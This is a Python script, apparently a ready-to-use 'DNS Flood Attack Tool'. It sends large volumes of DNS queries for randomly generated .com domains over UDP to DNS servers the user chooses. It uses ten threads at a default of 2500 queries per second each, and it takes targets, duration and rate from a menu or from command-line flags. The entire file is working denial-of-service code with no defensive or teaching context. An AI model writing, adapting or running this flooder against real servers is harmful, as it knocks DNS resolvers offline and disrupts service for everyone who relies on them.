#!/usr/bin/env python3
# DNS Flood Attack

import argparse
import socket
import random
import struct
import threading
import time
import os
import signal
import sys

RED = "\033[38;2;255;0;0m"
RESET = "\033[0m"
BOLD = "\033[1m"

# Global variables
dnsServers = []
attackDuration = 0
queryRate = 0
dnsThreads = 10 
dnsRunning = False
startTime = None
packetsSent = 0
stopTimer = False
stdoutLock = threading.Lock()
timerThread = None

def UpdateTimer(startTime):
    global stopTimer, packetsSent
    while not stopTimer:
        elapsed = time.time() - startTime
        elapsedFormatted = time.strftime("%H:%M:%S", time.gmtime(elapsed))
        with stdoutLock:
            sys.stdout.write(f"\rPackets Sent: {BOLD}{packetsSent}{RESET} | Duration: {BOLD}{elapsedFormatted}{RESET}")
            sys.stdout.flush()
        time.sleep(1)
    # Clean up the progress line once done
    with stdoutLock:
        sys.stdout.write("\n")
        sys.stdout.flush()

def GenerateRandomDomain():
    letters = "abcdefghijklmnopqrstuvwxyz"
    domain = "".join(random.choice(letters) for _ in range(random.randint(5, 10)))
    return domain + ".com"

def CreateDnsQuery(domain):
    transactionId = random.randint(0, 65535)
    flags = struct.pack(">H", 0x0100)  # standard query with recursion desired
    numQueries = struct.pack(">H", 1)
    numAnswers = struct.pack(">H", 0)
    numAuthority = struct.pack(">H", 0)
    numAdditional = struct.pack(">H", 0)
    encodedDomain = b""
    for label in domain.split("."):
        encodedDomain += struct.pack(">B", len(label)) + label.encode()
    encodedDomain += b"\x00"
    queryType = struct.pack(">H", 1)  # A record
    queryClass = struct.pack(">H", 1)  # IN class
    return (struct.pack(">H", transactionId) + flags + numQueries +
            numAnswers + numAuthority + numAdditional +
            encodedDomain + queryType + queryClass)

def SendDnsQueries():
    global dnsRunning, packetsSent
    endTime = time.time() + attackDuration
    while dnsRunning and time.time() < endTime:
        try:
            targetIp = random.choice(dnsServers)
            domain = GenerateRandomDomain()
            query = CreateDnsQuery(domain)
            isIpv6 = ":" in targetIp
            sockType = socket.AF_INET6 if isIpv6 else socket.AF_INET
            sock = socket.socket(sockType, socket.SOCK_DGRAM)
            sock.sendto(query, (targetIp, 53))
            sock.close()
            packetsSent += 1
            time.sleep(1 / queryRate)
        except Exception as e:
            print(f"Error: {str(e)}")
            time.sleep(0.001)

def DnsFlood():
    threads = []
    for _ in range(dnsThreads):
        t = threading.Thread(target=SendDnsQueries)
        t.daemon = True
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

def Start():
    global dnsRunning, startTime, stopTimer, timerThread, packetsSent
    print(f"\n{RED}Attack Configuration:{RESET}")
    print(f"{RED}- DNS Servers: {RESET}{BOLD}{', '.join(dnsServers)}{RESET}")
    print(f"{RED}- Duration: {RESET}{BOLD}{attackDuration}s{RESET}")
    print(f"{RED}- Packets: {RESET}{BOLD}{queryRate * dnsThreads} per second\n{RESET}")
    print(f"{RED}Starting DNS flood attack...{RESET}\n")
    dnsRunning = True
    packetsSent = 0
    startTime = time.time()
    stopTimer = False
    # Start the timer thread
    timerThread = threading.Thread(target=UpdateTimer, args=(startTime,))
    timerThread.start()
    try:
        DnsFlood()
    except KeyboardInterrupt:
        print("\nInterrupted by user!")
    Stop()

def Stop():
    global dnsRunning, stopTimer, timerThread
    dnsRunning = False
    stopTimer = True
    if timerThread is not None and timerThread.is_alive():
        timerThread.join()
    print(f"\n{RED}Stopping the attack...{RESET}")

def SignalHandler(sig, frame):
    
    Stop()
    sys.exit(0)

def Menu():
    global dnsServers, attackDuration, queryRate
    dnsServers = input(f"\n{RED}Enter the DNS server IP addresses (comma-separated): {RESET}").split(",")
    attackDuration = int(input(f"{RED}Enter the attack duration in seconds: {RESET}"))
    queryRate = int(input(f"{RED}Enter the query rate (it will be multiplied by 10): {RESET}"))
    Start()

def Terminal():
    parser = argparse.ArgumentParser(description="DNS Flood Attack Tool")
    parser.add_argument("-d", "--dns", type=str, required=True, help="Comma-separated list of DNS server IP addresses.")
    parser.add_argument("-t", "--duration", type=int, default=120, help="Attack duration in seconds (default: 120).")
    parser.add_argument("-q", "--query_rate", type=int, default=2500, help="Queries per second per thread (default: 2500).")
    args = parser.parse_args()
    global dnsServers, attackDuration, queryRate
    dnsServers = args.dns.split(",")
    attackDuration = args.duration
    queryRate = args.query_rate
    Start()

def Main():
    signal.signal(signal.SIGINT, SignalHandler)
    if len(sys.argv) > 1:
        Terminal()
    else:
        Menu()

if __name__ == "__main__":
    Main()
